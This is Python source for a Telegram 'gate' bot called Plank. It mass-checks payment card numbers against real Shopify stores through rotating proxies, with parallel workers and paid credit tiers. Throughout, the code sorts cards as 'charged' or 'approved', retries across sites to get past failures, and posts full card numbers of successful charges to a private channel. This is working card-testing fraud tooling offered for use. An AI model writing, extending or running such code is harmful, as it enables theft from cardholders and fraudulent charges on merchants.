"""
Plank — Gate handlers: /sh, /msh
Single-card checks and mass-check orchestration via external API.
"""

import asyncio
import uuid
import time
from io import BytesIO
from datetime import datetime, timezone

from telegram import Update
from telegram.ext import ContextTypes

from config import PLANS, BRAND_NAME, SHOPIFY_SITES_FILE, HIT_PUBLIC_CHAT_ID, HIT_PRIVATE_CHANNEL_ID, OWNER_DEBUG_MODE
from database import (
    ensure_user, get_user, deduct_credits, log_hit, get_user_proxies, run_in_db,
    save_mass_session, get_mass_session,
)
from utils.emojis import (
    bold, E_MONEY, E_CHECK, E_CROSS, E_ERROR, E_BOLT, E_HEART, E_BIN, E_CHAIN,
    E_CLOCK, E_WARN, E_FIRE, E_DIAMOND, E_PAW, E_STOP, E_RETRY, section, get_emoji,
)
from utils.helpers import (
    get_plan_info, credits_display, parse_cards, progress_bar,
    progress_pct, timestamp_now, mask_card, proxy_to_url, is_owner,
    lookup_bin,
)
from utils.keyboards import mass_keyboard
from utils.checkers import check_shopify
from handlers.start import membership_guard

import random
import os

# Active mass sessions: session_id -> state dict
_sessions: dict[str, dict] = {}


def _resolve_checker_fn(name: str):
    if name == "check_shopify":
        return check_shopify
    return check_shopify


async def _get_or_load_session(session_id: str) -> dict | None:
    state = _sessions.get(session_id)
    if state:
        return state
    db_state = await run_in_db(get_mass_session, session_id)
    if db_state:
        db_state["checker_fn"] = _resolve_checker_fn(db_state["checker_name"])
        _sessions[session_id] = db_state
        return db_state
    return None


def no_proxy_warning() -> str:
    return (
        f"{section(E_CHAIN, 'No Proxy')}\n\n"
        f"╰ /proxy add host:port:user:pass\n"
    )


async def _get_user_proxy(user_id: int) -> str | None:
    proxies = await run_in_db(get_user_proxies, user_id, True)
    if not proxies:
        proxies = await run_in_db(get_user_proxies, user_id, False)
    return random.choice(proxies) if proxies else None


_sites_cache: list[str] | None = None
_sites_lock = asyncio.Lock()


def _load_sites_sync() -> list[str]:
    if not os.path.exists(SHOPIFY_SITES_FILE):
        return ["kyliebaby.com"]
    try:
        with open(SHOPIFY_SITES_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return ["kyliebaby.com"]


async def get_shopify_sites() -> list[str]:
    global _sites_cache
    if _sites_cache is not None:
        return _sites_cache
    async with _sites_lock:
        if _sites_cache is None:
            _sites_cache = await asyncio.to_thread(_load_sites_sync)
    return _sites_cache


def invalidate_sites_cache():
    global _sites_cache
    _sites_cache = None


def _categorize(response: str) -> str:
    r = response.upper()
    if any(w in r for w in ("ORDER_PLACED", "CHARGED")):
        return "charged"
    if any(w in r for w in ("3DS_REQUIRED", "INSUFFICIENT_FUNDS", "INVALID_CVC",
                            "DO_NOT_HONOR", "PICKUP_CARD", "LIMIT_EXCEEDED",
                            "AUTHENTICATION_REQUIRED")):
        return "approved"
    
    SITE_ERRORS = (
        "ERROR", "TIMEOUT", "PRICE_OVER_MAX", "NO_PRODUCT", "NO PRODUCT", "NO_SESSION_TOKEN",
        "PRODUCT_OVER_MAIN", "PRODUCT_OVER_MAX", "SITE_REQUIRES_LOGIN",
        "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
        "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
        "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE", "NO_PAYMENT_METHOD",
        "DELIVERY_ADDRESS2_REQUIRED", "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
        "TAX_NEW_TAX_MUST_BE_ACCEPTED", "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "REQUEST_ERROR",
        "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
        "ARTIFACT_DISSATISFACTION"
    )
    if any(e in r for e in SITE_ERRORS):
        return "error"
    return "dead"


def _should_retry(response: str) -> bool:
    r = response.upper()
    SITE_ERRORS = (
        "ERROR", "TIMEOUT", "PRICE_OVER_MAX", "NO_PRODUCT", "NO PRODUCT", "NO_SESSION_TOKEN",
        "PRODUCT_OVER_MAIN", "PRODUCT_OVER_MAX", "SITE_REQUIRES_LOGIN",
        "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
        "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
        "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE", "NO_PAYMENT_METHOD",
        "DELIVERY_ADDRESS2_REQUIRED", "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
        "TAX_NEW_TAX_MUST_BE_ACCEPTED", "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "REQUEST_ERROR",
        "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
        "ARTIFACT_DISSATISFACTION", "API_ERROR"
    )
    return any(w in r for w in SITE_ERRORS)


# ── Single Shopify ────────────────────────────────────

async def sh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await membership_guard(update, context):
        return

    user = update.effective_user
    db_user = await run_in_db(ensure_user, user.id, user.username or "")
    plan_info = get_plan_info(db_user["plan"])

    if not context.args:
        await update.message.reply_text(
            f"{E_BOLT} <b>Shopify Gate</b>\n\n{E_HEART} /sh CC|MM|YY|CVV\n"
        )
        return

    card_str = context.args[0].strip()
    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text(f"{E_BIN} format: /sh CC|MM|YY|CVV")
        return

    user_proxy = await _get_user_proxy(user.id)
    if not user_proxy:
        await update.message.reply_text(no_proxy_warning())
        return

    if not await run_in_db(deduct_credits, user.id, 1):
        await update.message.reply_text(f"{E_CROSS} no credits · /daily")
        return

    msg = await update.message.reply_text(
        f"{E_BOLT} checking <code>{card_str}</code>...\n"
    )
    sites = await get_shopify_sites()
    site = random.choice(sites) if sites else "kyliebaby.com"

    is_priority = db_user.get("plan", "dirt") in ("diamond", "bedrock")
    # Retry on retriable errors with site and proxy rotation (up to 5 attempts total)
    for attempt in range(5):
        result = await check_shopify(
            parts[0], parts[1], parts[2], parts[3],
            site=site, proxy=proxy_to_url(user_proxy) if user_proxy else None,
            is_priority=is_priority,
        )
        response = result.get("Response", "CARD_DECLINED")
        if not _should_retry(response) or attempt == 4:
            break
        site = random.choice(sites) if sites else site
        new_proxy = await _get_user_proxy(user.id)
        if new_proxy:
            user_proxy = new_proxy

    category = _categorize(response)
    if category == "error":
        category = "dead"
        response = "CARD_DECLINED"

    price = result.get("Price", "0.00")
    gate = result.get("Gate", "Shopify Payments")
    check_time = result.get("Time", "0s")

    if category == "charged":
        emoji, color_label = E_MONEY, "Charged"
    elif category == "approved":
        emoji, color_label = E_CHECK, "Approved"
    elif category == "error":
        emoji, color_label = E_ERROR, "Error"
    else:
        emoji, color_label = E_CROSS, "Declined"

    await run_in_db(log_hit, user.id, "Shopify", card_str, response, price, site)

    text = (
        f"{emoji} <b>Shopify</b> · {color_label}\n\n"
        f"{E_HEART} card: <code>{card_str}</code>\n"
        f"{E_HEART} resp: {response}\n"
        f"{E_HEART} gate: {gate}\n"
        f"{E_HEART} amt: ${price} · {check_time}\n"
    )
    if OWNER_DEBUG_MODE.get(user.id, False):
        text += f"{E_HEART} site: {result.get('Site', site)}\n"
    
    await msg.edit_text(text)

    if category == "charged":
        await _send_hit_notification(context, user, gate, card_str, price)
        await _send_charge_dm(context, user, gate, card_str, price)


# ── Mass check core ───────────────────────────────────

# ── Mass check core ───────────────────────────────────

async def _execute_mass(
    state: dict,
    cards_to_process: list[str],
    context: ContextTypes.DEFAULT_TYPE,
    user,
):
    db_user = await run_in_db(ensure_user, user.id, user.username or "")
    is_priority = db_user.get("plan", "dirt") in ("diamond", "bedrock")

    session_id = state["id"]
    gate_name = state["gate"]
    checker_fn = state["checker_fn"]
    user_proxies = state["user_proxies"]
    cooldown = state["cooldown"]
    site = state["site"]
    workers = state["workers"]

    state["last_active"] = time.time()

    edit_lock = asyncio.Lock()
    last_update = [time.time()]

    async def _do_edit():
        try:
            await context.bot.edit_message_text(
                chat_id=state["chat_id"],
                message_id=state["msg_id"],
                text=_build_mass_text(state),
                reply_markup=mass_keyboard(
                    session_id,
                    approved=state["approved"],
                    charged=state["charged"],
                    dead=state["dead"],
                    error=state["error"],
                    stopped=state["stopped"],
                ),
            )
        except Exception:
            pass

    async def trigger_status_update():
        now = time.time()
        state["last_active"] = now
        is_final = state["processed"] == state["total"]
        if is_final or (now - last_update[0] >= 5.0):
            await run_in_db(save_mass_session, state)
            if is_final:
                async with edit_lock:
                    last_update[0] = now
                    await _do_edit()
            else:
                if not edit_lock.locked():
                    async with edit_lock:
                        now = time.time()
                        if now - last_update[0] >= 5.0:
                            last_update[0] = now
                            await _do_edit()

    # Put all cards into a queue
    queue = asyncio.Queue()
    for c in cards_to_process:
        await queue.put(c)

    async def worker():
        while not queue.empty() and not state["stopped"]:
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            parts = card.split("|")
            if len(parts) != 4:
                state["processed"] += 1
                state["error"] += 1
                state["results"]["error"].append(f"{card} | $0.00 | INVALID_FORMAT")
                asyncio.create_task(trigger_status_update())
                queue.task_done()
                continue

            proxy = proxy_to_url(random.choice(user_proxies)) if user_proxies else None
            sites = await get_shopify_sites()
            card_site = random.choice(sites) if sites else (site or "kyliebaby.com")

            for attempt in range(5):
                result = await checker_fn(
                    parts[0], parts[1], parts[2], parts[3],
                    site=card_site, proxy=proxy,
                    is_priority=is_priority,
                )
                response = result.get("Response", "CARD_DECLINED")
                if not _should_retry(response) or attempt == 4:
                    break
                card_site = random.choice(sites) if sites else card_site
                if user_proxies:
                    proxy = proxy_to_url(random.choice(user_proxies))

            category = _categorize(response)
            if category == "error":
                category = "dead"
                response = "CARD_DECLINED"

            price = result.get("Price", "0.00")

            state["processed"] += 1
            state[category] += 1
            card_site = result.get("Site", site)
            if OWNER_DEBUG_MODE.get(user.id, False):
                state["results"][category].append(f"{card} | ${price} | {response} | {card_site}")
            else:
                state["results"][category].append(f"{card} | ${price} | {response}")

            await run_in_db(log_hit, user.id, gate_name, card, response, price,
                           result.get("Site", site))

            if category == "charged":
                gate_display = result.get("Gate", gate_name)
                await _send_hit_notification(context, user, gate_display, card, price)
                await _send_charge_dm(context, user, gate_display, card, price)

            asyncio.create_task(trigger_status_update())
            queue.task_done()

            if cooldown > 0 and not queue.empty() and not state["stopped"]:
                await asyncio.sleep(cooldown)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks)

    # Done with this batch
    state["last_active"] = time.time()
    try:
        await context.bot.edit_message_text(
            chat_id=state["chat_id"],
            message_id=state["msg_id"],
            text=_build_mass_text(state, finished=True),
            reply_markup=mass_keyboard(
                session_id,
                approved=state["approved"],
                charged=state["charged"],
                dead=state["dead"],
                error=state["error"],
                stopped=True,
            ),
        )
    except Exception:
        pass

    asyncio.create_task(_delayed_auto_send(state, context))


async def _delayed_auto_send(state: dict, context: ContextTypes.DEFAULT_TYPE):
    await asyncio.sleep(30)
    try:
        await context.bot.edit_message_reply_markup(
            chat_id=state["chat_id"],
            message_id=state["msg_id"],
            reply_markup=None,
        )
    except Exception:
        pass

    claimed = state.get("claimed_categories", [])
    
    # Auto-send charged results
    if "charged" not in claimed:
        results = state["results"].get("charged", [])
        if results:
            content = "\n".join(results)
            buf = BytesIO(content.encode("utf-8"))
            buf.name = "plank_charged.txt"
            try:
                await context.bot.send_document(
                    chat_id=state["chat_id"],
                    document=buf,
                    caption=f"{E_PAW} Charged (Auto-sent) · {len(results)}"
                )
            except Exception:
                pass

    # Auto-send approved results
    if "approved" not in claimed:
        results = state["results"].get("approved", [])
        if results:
            content = "\n".join(results)
            buf = BytesIO(content.encode("utf-8"))
            buf.name = "plank_approved.txt"
            try:
                await context.bot.send_document(
                    chat_id=state["chat_id"],
                    document=buf,
                    caption=f"{E_PAW} Approved (Auto-sent) · {len(results)}"
                )
            except Exception:
                pass


async def _run_mass(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    gate_name: str,
    checker_fn,
    cards: list[str],
    site: str = "",
):
    user = update.effective_user
    db_user = await run_in_db(ensure_user, user.id, user.username or "")
    plan_info = get_plan_info(db_user["plan"])
    workers = plan_info["workers"]
    cooldown = plan_info["cooldown"]
    mass_limit = plan_info["mass_limit"]

    user_proxies = await run_in_db(get_user_proxies, user.id, True)
    if not user_proxies:
        user_proxies = await run_in_db(get_user_proxies, user.id, False)
    if not user_proxies:
        await update.message.reply_text(no_proxy_warning())
        return

    if not is_owner(user.id) and len(cards) > mass_limit:
        skipped_cards = cards[mass_limit:]
        cards = cards[:mass_limit]
        skipped_text = "\n".join(skipped_cards)
        buf = BytesIO(skipped_text.encode("utf-8"))
        buf.name = "skipped.txt"
        try:
            await update.message.reply_document(
                buf,
                caption=f"{E_WARN} Limit exceeded! Checked first {mass_limit} cards. Skipped remaining {len(skipped_cards)} cards."
            )
        except Exception:
            pass

    total_cost = len(cards)
    if not is_owner(user.id):
        deducted = await run_in_db(deduct_credits, user.id, total_cost)
        if not deducted:
            current_credits = db_user["credits"]
            await update.message.reply_text(
                f"{E_CROSS} need <b>{total_cost}</b> credits · have <b>{credits_display(current_credits)}</b>"
            )
            return

    loading_msg = await update.message.reply_text(
        f"{E_FIRE} <b>{gate_name} Mass</b> · loading...\n\n"
        f"{E_HEART} {len(cards)} cards · {workers} workers\n"
    )

    session_id = uuid.uuid4().hex[:8]
    state = {
        "id": session_id,
        "gate": gate_name,
        "user_id": user.id,
        "username": user.username or user.first_name,
        "cards": cards,
        "total": len(cards),
        "processed": 0,
        "charged": 0,
        "approved": 0,
        "dead": 0,
        "error": 0,
        "stopped": False,
        "results": {"charged": [], "approved": [], "dead": [], "error": []},
        "claimed_categories": [],
        "site": site,
        "workers": workers,
        "checker_fn": checker_fn,
        "user_proxies": user_proxies,
        "cooldown": cooldown,
        "last_active": time.time(),
        "start_time": time.time(),
    }
    _sessions[session_id] = state
    await run_in_db(save_mass_session, state)

    try:
        await loading_msg.edit_text(
            _build_mass_text(state),
            reply_markup=mass_keyboard(session_id),
        )
        status_msg = loading_msg
    except Exception:
        status_msg = await update.message.reply_text(
            _build_mass_text(state),
            reply_markup=mass_keyboard(session_id),
        )
    state["msg_id"] = status_msg.message_id
    state["chat_id"] = update.effective_chat.id

    async def _cleanup():
        while True:
            await asyncio.sleep(60)
            if time.time() - state.get("last_active", 0) > 300:
                _sessions.pop(session_id, None)
                break
    asyncio.create_task(_cleanup())

    # Run execution helper
    await _execute_mass(state, cards, context, user)


def _fmt_duration(seconds: float) -> str:
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds}s"
    m, s = divmod(seconds, 60)
    return f"{m}m {s:02d}s"


def _build_mass_text(state: dict, finished: bool = False) -> str:
    total = state["total"]
    processed = state["processed"]
    pct = progress_pct(processed, total)
    bar = progress_bar(processed, total)
    status = "done" if finished else (f"{pct}%" if not state["stopped"] else "stopped")

    elapsed = time.time() - state.get("start_time", time.time())
    elapsed_str = _fmt_duration(elapsed)

    if processed > 0 and not finished:
        eta_secs = (elapsed / processed) * (total - processed)
        eta_str = _fmt_duration(eta_secs)
    elif finished:
        eta_str = "0s"
    else:
        eta_str = "..."

    gate = state['gate']
    text = (
        f"{E_FIRE} <b>{gate}</b> · {status}\n\n"
        f"{E_HEART} progress: {bar} <b>{processed}/{total}</b>\n"
        f"⏱ elapsed: <b>{elapsed_str}</b>  |  eta: <b>{eta_str}</b>\n\n"
        f"{E_MONEY} <b>{state['charged']}</b> / {E_CHECK} <b>{state['approved']}</b> / {E_CROSS} <b>{state['dead']}</b> / {E_ERROR} <b>{state['error']}</b>\n"
    )

    return text


# ── Mass Shopify ──────────────────────────────────────

async def msh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await membership_guard(update, context):
        return

    user = update.effective_user
    await run_in_db(ensure_user, user.id, user.username or "")

    cards = await _extract_cards(update, context)
    if not cards:
        await update.message.reply_text(
            f"{E_FIRE} <b>Shopify Mass</b>\n\n{E_HEART} /msh CC|MM|YY|CVV or reply .txt\n"
        )
        return

    sites = await get_shopify_sites()
    site = random.choice(sites) if sites else "kyliebaby.com"
    await _run_mass(update, context, "Shopify", check_shopify, cards, site=site)


# ── Card extraction ───────────────────────────────────

async def _extract_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> list[str]:
    reply = update.message.reply_to_message
    if reply and reply.document:
        try:
            file = await reply.document.get_file()
            data = await file.download_as_bytearray()
            text = data.decode("utf-8", errors="ignore")
            return await asyncio.to_thread(parse_cards, text)
        except Exception:
            return []

    if update.message.document:
        try:
            file = await update.message.document.get_file()
            data = await file.download_as_bytearray()
            text = data.decode("utf-8", errors="ignore")
            return await asyncio.to_thread(parse_cards, text)
        except Exception:
            return []

    if context.args:
        text = " ".join(context.args).replace(" ", "\n")
        cards = await asyncio.to_thread(parse_cards, text)
        if cards:
            return cards

    caption = update.message.caption or ""
    if caption:
        cmd_removed = caption.split(maxsplit=1)[1] if " " in caption else ""
        return await asyncio.to_thread(parse_cards, cmd_removed)

    return []


# ── Mass callback handlers ────────────────────────────

async def mass_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    session_id = query.data.split("_")[-1]
    state = await _get_or_load_session(session_id)

    if not state:
        try:
            await query.answer("session expired", show_alert=True)
        except Exception:
            pass
        return

    if query.from_user.id != state["user_id"]:
        try:
            await query.answer("this was not started by you", show_alert=True)
        except Exception:
            pass
        return

    state["stopped"] = True
    await run_in_db(save_mass_session, state)
    try:
        await query.answer(f"{E_STOP} stopping...")
    except Exception:
        pass

    try:
        await context.bot.edit_message_text(
            chat_id=query.message.chat_id,
            message_id=query.message.message_id,
            text=_build_mass_text(state, finished=False),
            reply_markup=mass_keyboard(
                session_id,
                approved=state["approved"],
                charged=state["charged"],
                dead=state["dead"],
                error=state["error"],
                stopped=True,
            ),
        )
    except Exception:
        pass


async def mass_view_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    parts = query.data.split("_")
    category = parts[1]
    session_id = parts[2]
    state = await _get_or_load_session(session_id)

    if not state:
        try:
            await query.answer("session expired", show_alert=True)
        except Exception:
            pass
        return

    if query.from_user.id != state["user_id"]:
        try:
            await query.answer("this was not started by you", show_alert=True)
        except Exception:
            pass
        return

    results = state["results"].get(category, [])
    if not results:
        try:
            await query.answer(f"no {category} yet", show_alert=True)
        except Exception:
            pass
        return

    try:
        await query.answer()
    except Exception:
        pass

    if "claimed_categories" not in state:
        state["claimed_categories"] = []
    if category not in state["claimed_categories"]:
        state["claimed_categories"].append(category)

    content = "\n".join(results)
    buf = BytesIO(content.encode("utf-8"))
    buf.name = f"plank_{category}.txt"
    await query.message.reply_document(
        buf,
        caption=f"{E_PAW} {category.upper()} · {len(results)}"
    )


# ── Charge DM ─────────────────────────────────────────

async def _send_charge_dm(context, user, gate: str, card: str, price: str):
    bin_number = card.split("|")[0][:6] if "|" in card else card[:6]
    bin_info = await lookup_bin(bin_number)

    dm_text = (
        f"{E_MONEY} <b>Charged</b> · {gate}\n\n"
        f"{E_HEART} card: <code>{card}</code>\n"
        f"{E_HEART} amount: ${price}\n"
        f"{E_HEART} brand: {bin_info['scheme']} · {bin_info['type']} · {bin_info['brand']}\n"
        f"{E_HEART} bank: {bin_info['bank']}\n"
        f"{E_HEART} country: {bin_info['country']} {bin_info['country_emoji']}\n"
        f"{E_HEART} user: @{user.username or user.first_name}\n"
    )
    try:
        await context.bot.send_message(user.id, dm_text)
    except Exception:
        pass


# ── Hit notification ──────────────────────────────────

async def _send_hit_notification(context, user, gate: str, card: str, price: str):
    uname = user.username or user.first_name

    if HIT_PUBLIC_CHAT_ID:
        public_text = (
            f"{E_MONEY} <b>Charged</b> · @{uname}\n\n"
            f"{E_HEART} gate: {gate}\n"
            f"{E_HEART} amount: ${price}\n"
        )
        try:
            await context.bot.send_message(HIT_PUBLIC_CHAT_ID, public_text)
        except Exception:
            pass

    if HIT_PRIVATE_CHANNEL_ID:
        private_text = (
            f"{E_MONEY} <b>Charged</b> · @{uname}\n\n"
            f"{E_HEART} gate: {gate}\n"
            f"{E_HEART} amount: ${price}\n"
            f"{E_HEART} card: <code>{card}</code>\n"
        )
        try:
            await context.bot.send_message(HIT_PRIVATE_CHANNEL_ID, private_text)
        except Exception:
            pass


# ── Mass retry callback ───────────────────────────────

async def mass_retry_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    session_id = query.data.split("_")[-1]
    state = await _get_or_load_session(session_id)

    if not state:
        try:
            await query.answer("session expired", show_alert=True)
        except Exception:
            pass
        return

    if query.from_user.id != state["user_id"]:
        try:
            await query.answer("this was not started by you", show_alert=True)
        except Exception:
            pass
        return

    # Check if already running or stopped
    if state["processed"] < state["total"] and not state["stopped"]:
        try:
            await query.answer("Check is already running...", show_alert=True)
        except Exception:
            pass
        return

    error_entries = state["results"].get("error", [])
    if not error_entries:
        try:
            await query.answer("no errors to retry", show_alert=True)
        except Exception:
            pass
        return

    try:
        await query.answer(f"{E_RETRY} Retrying errors...")
    except Exception:
        pass

    # Extract card strings from errors
    cards_to_retry = [entry.split(" | ")[0] for entry in error_entries]

    # Reset processed count and error counts for the retry
    state["processed"] = state["total"] - len(cards_to_retry)
    state["error"] = 0
    state["results"]["error"] = []
    state["stopped"] = False
    await run_in_db(save_mass_session, state)

    # Edit status message immediately to show progress resumed
    try:
        await context.bot.edit_message_text(
            chat_id=state["chat_id"],
            message_id=state["msg_id"],
            text=_build_mass_text(state),
            reply_markup=mass_keyboard(
                session_id,
                approved=state["approved"],
                charged=state["charged"],
                dead=state["dead"],
                error=state["error"],
                stopped=False,
            ),
        )
    except Exception:
        pass

    # Run the execution helper asynchronously
    user = query.from_user
    asyncio.create_task(_execute_mass(state, cards_to_retry, context, user))

